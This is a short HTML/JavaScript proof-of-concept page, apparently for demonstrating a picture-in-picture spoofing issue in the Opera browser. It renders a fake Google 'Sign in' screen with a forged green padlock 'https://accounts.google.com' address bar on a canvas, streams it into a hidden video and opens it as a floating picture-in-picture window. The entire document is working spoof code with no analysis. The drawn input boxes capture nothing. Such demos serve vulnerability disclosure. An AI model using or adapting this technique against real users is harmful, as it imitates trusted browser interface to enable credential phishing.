<!DOCTYPE html>
<html>
<head>
  <title>Opera PiP Spoof Demo</title>
  <style>
    body { font-family: Arial, sans-serif; }
    button {
      padding: 8px 12px;
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin: 20px;
    }
  </style>
</head>
<body>
  <h2>Opera PiP Spoof Demo</h2>
  <button onclick="launchFake()">Launch Fake Google Login</button>

  <video id="pip-video" style="display:none;" playsinline></video>

  <script>
    async function launchFake() {
      let video = document.getElementById('pip-video');
      let canvas = document.createElement('canvas');
      canvas.width = 400;
      canvas.height = 300;
      let ctx = canvas.getContext('2d');

      // Stream canvas ke video
      let stream = canvas.captureStream();
      video.srcObject = stream;

      // Gambar fake login UI
      setInterval(() => {
        ctx.fillStyle = "#fff";
        ctx.fillRect(0,0,400,300);

        // Fake address bar
        ctx.fillStyle = "green";
        ctx.font = "14px Arial";
        ctx.fillText("ðŸ”’ https://accounts.google.com", 10, 20);

        // Title
        ctx.fillStyle = "black";
        ctx.font = "16px Arial bold";
        ctx.fillText("Sign in", 160, 60);

        // Input labels
        ctx.font = "14px Arial";
        ctx.fillText("Email or phone:", 20, 100);
        ctx.fillText("Password:", 20, 150);

        // Fake input boxes
        ctx.strokeStyle = "#ccc";
        ctx.strokeRect(150, 85, 200, 25);
        ctx.strokeRect(150, 135, 200, 25);

        // Fake button
        ctx.fillStyle = "#1a73e8";
        ctx.fillRect(150, 200, 100, 30);
        ctx.fillStyle = "#fff";
        ctx.fillText("Next", 180, 220);
      }, 500);

      // Tunggu metadata siap, baru PiP
      video.onloadedmetadata = async () => {
        await video.play();
        try {
          await video.requestPictureInPicture();
        } catch (err) {
          alert("PiP not supported: " + err);
        }
      };
    }
  </script>
</body>
</html>
